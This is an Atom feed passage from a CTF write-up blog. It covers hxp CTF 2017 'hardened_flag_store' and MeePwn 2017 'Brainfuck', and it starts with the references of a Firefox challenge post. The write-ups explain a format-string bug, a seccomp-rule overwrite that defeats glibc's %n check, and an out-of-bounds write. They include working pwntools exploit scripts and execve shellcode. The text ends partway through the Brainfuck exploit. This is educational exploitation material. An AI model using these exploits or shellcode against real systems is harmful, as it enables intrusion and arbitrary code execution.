Hope I’ll be able to solve it and post another write-up :) .</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/saelo/feuerfuchs" target="_blank" rel="noopener">feuerfuchs challenge on github</a></li><li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Hacking_Tips" target="_blank" rel="noopener">SpiderMonkey hacking tips</a></li><li><a href="https://wiki.mozilla.org/JavaScript:New_to_SpiderMonkey" target="_blank" rel="noopener">JavaScript:New to SpiderMonkey</a></li><li><a href="https://github.com/mozilla/gecko-dev/blob/c64d600a96280475b6306a3b1ff933431c572784/js/src/builtin/TypedArray.js#L156" target="_blank" rel="noopener">SpiderMonkey source code: TypedArray.js</a></li><li><a href="https://github.com/mozilla/gecko-dev/blob/0bed6b5d6d35e358ac2cd3ea5b13a61935fa3d59/js/src/vm/SelfHosting.cpp#L1176" target="_blank" rel="noopener">SpiderMonkey source code: SelfHosting.cpp</a></li><li><a href="https://github.com/ricardoquesada/Spidermonkey/blob/master/js/public/Value.h" target="_blank" rel="noopener">SpiderMonkey source code: Value.h</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray" target="_blank" rel="noopener">TypedArray on MDN</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/copyWithin" target="_blank" rel="noopener">copyWithin on MDN</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried &lt;a href=&quot;http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;qwn2own&lt;/a&gt;, &lt;a href=&quot;https://tradahacking.vn/hitb-2017-writeup-sgx-browser-5c1c48e0d6fe&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SGX_Browser&lt;/a&gt; and &lt;a href=&quot;https://github.com/saelo/feuerfuchs&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;feuerfuchs&lt;/a&gt;. &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
      <category term="Firefox" scheme="https://bruce30262.github.io/tags/Firefox/"/>
    
      <category term="Browser" scheme="https://bruce30262.github.io/tags/Browser/"/>
    
      <category term="SpiderMonkey" scheme="https://bruce30262.github.io/tags/SpiderMonkey/"/>
    
      <category term="Javascript" scheme="https://bruce30262.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>hxp CTF 2017 -- hardened_flag_store</title>
    <link href="https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/"/>
    <id>https://bruce30262.github.io/2017/11/20/hxp-CTF-2017-hardened-flag-store/</id>
    <published>2017-11-20T11:18:00.000Z</published>
    <updated>2018-01-03T15:08:05.611Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Pwnable</p><p>64 bit ELF with PIE, NX, FULL RELRO enabled </p><a id="more"></a>  <p>The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using <a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>So now the program are only allowed to use the following system calls: <code>exit</code>, <code>read</code>, <code>write</code>, <code>open</code> and <code>close</code>.  </p><p>After that the program will do the following ( pseudo code ) :  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cnt = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">int</span> has_seccomp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (cnt--)</span><br><span class="line">&#123;</span><br><span class="line">    read(<span class="number">0</span>, input, <span class="number">96</span>); <span class="comment">// read user input</span></span><br><span class="line">    <span class="keyword">if</span> (!has_seccomp) init_seccomp(); <span class="comment">// set up seccomp rule</span></span><br><span class="line">    len = <span class="built_in">strlen</span>(secret_string) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; i++ ) <span class="comment">// check if input == secret_string</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( len - <span class="number">1</span> == i )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">        <span class="keyword">if</span> ( secret_string[i] != input[i] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(secret_string) == i )</span><br><span class="line">LABEL_19:</span><br><span class="line">        openflag(); <span class="comment">// input == secret_string, open flag.txt and print it to stdout</span></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, input); <span class="comment">// &lt;-- format string vuln</span></span><br><span class="line">    has_seccomp = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of <code>_fprintf_chk</code> is set to stderr, so we can’t use <code>%s</code> to leak the secret string.  </p><p>But there’s still one way to bypass the check. At line 16:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(secret_string) == i )</span><br><span class="line">LABEL_19:</span><br><span class="line">        openflag(); <span class="comment">// input == secret_string, open flag.txt and print it to stdout</span></span><br></pre></td></tr></table></figure><p>If we can overwrite the first character of the secret string to a null byte, and input a random string, both <code>strlen(secret_string)</code> and <code>i</code> will be <code>0</code>, thus bypass the check and will print out the flag.  </p><p>However this will require us to use the <code>%n</code> format string payload – which in this case will be blocked by the seccomp filter:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./flag_store</span><br><span class="line">%n</span><br><span class="line">Wrong secret :/</span><br><span class="line">[1]    5295 invalid system call  ./flag_store</span><br></pre></td></tr></table></figure><p>Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the <code>%n</code> character:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending null bytes</span><br><span class="line">[*] Sending fmt payload</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Wrong secret :/</span><br><span class="line">Wrong secret :/</span><br><span class="line">*** %n in writable segment detected ***</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p>OK, so we successfully overwrite the seccomp rule, but still the <code>%n</code> payload was blocked by <code>_fprintf_chk</code>, which is a more secure version of <code>fprintf</code>. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.</p><p>And so I started reading the <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area" target="_blank" rel="noopener">glibc source code</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">................</span><br><span class="line">    &#123;                                                                      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="keyword">int</span> __readonly_area (<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>)                      \</span><br><span class="line">        attribute_hidden;                                              \</span><br><span class="line">      readonly_format                                                      \</span><br><span class="line">        = __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)              \</span><br><span class="line">                                    * <span class="keyword">sizeof</span> (CHAR_T)));              \</span><br><span class="line">    &#125;                                                                      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)                                              \</span><br><span class="line">    __libc_fatal (<span class="string">"*** %n in writable segment detected ***\n"</span>);              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hmmmm, looks like we’ll have to make <code>readonly_format &gt;= 0</code> so it won’t call <code>__libc_fatal (&quot;*** %n in writable segment detected ***\n&quot;);</code>. Let’s trace into the <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area" target="_blank" rel="noopener">__readonly_area() function</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__readonly_area (<span class="keyword">const</span> <span class="keyword">char</span> *ptr, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *ptr_end = ptr + size;</span><br><span class="line"></span><br><span class="line">  FILE *fp = fopen (<span class="string">"/proc/self/maps"</span>, <span class="string">"rce"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* It is the system administrator's choice to not have /proc</span></span><br><span class="line"><span class="comment">         available to this process (e.g., because it runs in a chroot</span></span><br><span class="line"><span class="comment">         environment.  Don't fail in this case.  */</span></span><br><span class="line">      <span class="keyword">if</span> (errno == ENOENT</span><br><span class="line">          <span class="comment">/* The kernel has a bug in that a process is denied access</span></span><br><span class="line"><span class="comment">             to the /proc filesystem if it is set[ug]id.  There has</span></span><br><span class="line"><span class="comment">             been no willingness to change this in the kernel so</span></span><br><span class="line"><span class="comment">             far.  */</span></span><br><span class="line">          || errno == EACCES)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...................</span><br></pre></td></tr></table></figure><p>Ah ha ! We can see that <code>__readonly_area</code> will call <code>fopen()</code>, and see if its <code>errno</code> is equals to <code>EACCES</code> or <code>ENOENT</code>. <strong>If so, it will return 1</strong> !! Since we can write our own seccomp rule, we can totally make this happen !</p><p>So first we create our own seccomp rule:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># # check if arch is X86_64</span><br><span class="line">A = arch</span><br><span class="line">A == 0xc000003e ? next : ok</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? next : ok</span><br><span class="line">A = args[2]</span><br><span class="line">A == 0x1b6 ? magic : ok # check the 3rd arg of open()</span><br><span class="line">magic:</span><br><span class="line">return ERRNO(13) # ERRNO(EACCES)</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure><p>Notice that in order to make <code>open(&quot;flag.txt&quot;, 0x80000)</code> ( in the <code>openflag()</code> function ) works normally, we’ll have to add the rule <code>A == 0x1b6 ? magic : ok</code>. This indicates that if the 3rd argument of <code>open()</code> equals to <code>0x1b6</code>, return <code>ERRNO(13)</code>, otherwise allow the system call. I wrote this rule because I found that when <code>__readonly_area()</code> calls <code>fopen (&quot;/proc/self/maps&quot;, &quot;rce&quot;);</code>, the 3rd argument of <code>open()</code> was exactly <code>0x1b6</code>.  </p><p>By using the <a href="https://github.com/david942j/seccomp-tools#asm" target="_blank" rel="noopener">asm</a> feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./rule </span><br><span class="line"># # check if arch is X86_64</span><br><span class="line">A = arch</span><br><span class="line">A == 0xc000003e ? next : ok</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? next : ok</span><br><span class="line">A = args[2]</span><br><span class="line">A == 0x1b6 ? magic : ok</span><br><span class="line">magic:</span><br><span class="line">return ERRNO(13)</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br><span class="line"></span><br><span class="line">$ seccomp-tools asm ./rule</span><br><span class="line">&quot; \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&quot;</span><br></pre></td></tr></table></figure><p>At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># from brucepwn import *</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"35.198.105.104"</span></span><br><span class="line">PORT = <span class="number">10000</span></span><br><span class="line">ELF_PATH = <span class="string">"./flag_store"</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line">libc = elf.libc <span class="keyword">if</span> <span class="keyword">not</span> LIBC_PATH <span class="keyword">else</span> ELF(LIBC_PATH)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> libc: log.warning(<span class="string">"Failed to load libc"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = elf.process() # elf.process(argv=[argv1, argv2,...])</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"\x00"</span>*<span class="number">0x20</span></span><br><span class="line">    payload += <span class="string">" \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len:"</span>, len(payload)</span><br><span class="line">    <span class="keyword">assert</span> len(payload) &lt;= <span class="number">96</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="string">"%128c%128c%hhn"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}</code></p><p>First blood on this one ! WOOHOO ! 😎</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
&lt;p&gt;64 bit ELF with PIE, NX, FULL RELRO enabled &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="format_string" scheme="https://bruce30262.github.io/tags/format-string/"/>
    
      <category term="BOF" scheme="https://bruce30262.github.io/tags/BOF/"/>
    
      <category term="seccomp" scheme="https://bruce30262.github.io/tags/seccomp/"/>
    
      <category term="hxp" scheme="https://bruce30262.github.io/tags/hxp/"/>
    
  </entry>
  
  <entry>
    <title>MeePwn CTF 2017 -- Brainfuck 1 &amp; 2</title>
    <link href="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/"/>
    <id>https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/</id>
    <published>2017-07-16T07:28:00.000Z</published>
    <updated>2018-01-03T15:08:05.611Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Pwnable</p><p>Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp; NX enabled.  </p><a id="more"></a><h2 id="Brainfuck1"><a href="#Brainfuck1" class="headerlink" title="Brainfuck1"></a>Brainfuck1</h2><p>The program is a simple <a href="https://en.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">brainfuck</a> language interpreter: it read input ( brainfuck code ), translate the code to the corresponding x86 machine code and execute it.</p><p>For example, if we input <code>+++++++++</code> ( 9 <code>+</code> ), the program will translate the code into the following machine code:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7ff5000:      push   rbp</span><br><span class="line">0x7ffff7ff5001:      mov    rbp,rsp</span><br><span class="line">0x7ffff7ff5004:      sub    rsp,0x20</span><br><span class="line">0x7ffff7ff5008:      mov    r14,rdi   ; r14 is the data pointer </span><br><span class="line">0x7ffff7ff500b:      add    BYTE PTR [r14],0x9  ; [r14] += 9 </span><br><span class="line">0x7ffff7ff500f:      add    rsp,0x20</span><br><span class="line">0x7ffff7ff5013:      pop    rbp</span><br><span class="line">0x7ffff7ff5014:      ret</span><br></pre></td></tr></table></figure><p>The program has the following data structure:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bf_data</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *dp; <span class="comment">// data pointer</span></span><br><span class="line">    <span class="keyword">char</span> *sc_buf; <span class="comment">// machine code buffer</span></span><br><span class="line">    __int64 field_16 ; <span class="comment">// not sure about the usage</span></span><br><span class="line">    __int64 sc_pos;  <span class="comment">// machine code position</span></span><br><span class="line">    __int64 sc_size; <span class="comment">// machine code buffer size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>bf_data</code> is placed on the heap memory. It will treat <code>bf_data-&gt;dp</code> as the first parameter while executing the machine code.</p><p>The vulnerability is quite simple: it did not have the boundary check for the data pointer increment/decrement. For example, it we input 1000 <code>&gt;</code> and a <code>,</code>, we can write a byte at <code>bf_data-&gt;dp + 1000</code>, thus we have an out-of-bound read/write vulnerability.</p><p>Here’s the basic concept of how I exploit the service:</p><ol><li>Leak the machine code buffer address ( an mmap address with <code>rwx</code> permission )</li><li>Place our shellcode on the mmap buffer</li><li>Self-modified the machine code in <code>bf_data-&gt;sc_buf</code> so it will jump to our shellcode buffer and execute our shellcode.  </li></ol><p>First we use the OOB read to leak the machine code buffer address. After that, we use OOB write to overwrite <code>bf_data-&gt;dp</code>, making it point to our shellcode buffer, then use <code>&gt;</code> and <code>,</code> to write our shellcode to <code>bf_data-&gt;dp</code>.  </p><p>Now because <code>bf_data-&gt;dp</code> is near to <code>bf_data-&gt;sc_buf</code>, so again we can use the OOB write to modify the content of <code>bf_data-&gt;sc_buf</code>, creating a <strong>self-modified machine code</strong> situation. I decided to modify the end of the machine code into:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, shellcode_buf_addr</span><br><span class="line">call rax</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><figcaption><span>exp_bf1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.244.42"</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">"./bf1"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;"</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(move, content)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">",&gt;"</span>*len(content)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak mmap address </span></span><br><span class="line">    payload = <span class="string">"&lt;"</span>*<span class="number">0x28</span> <span class="comment"># move to &amp;bf_data-&gt;sc_buf</span></span><br><span class="line">    payload += <span class="string">".&gt;"</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    cmd(payload)</span><br><span class="line">    sc_base = u64(r.recvuntil(<span class="string">"&gt;&gt;"</span>)[:<span class="number">8</span>:]) &gt;&gt; <span class="number">8</span></span><br><span class="line">    r.unrecv(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    log.success(<span class="string">"sc_base: "</span>+hex(sc_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make size = 0x400 so it won't clear our 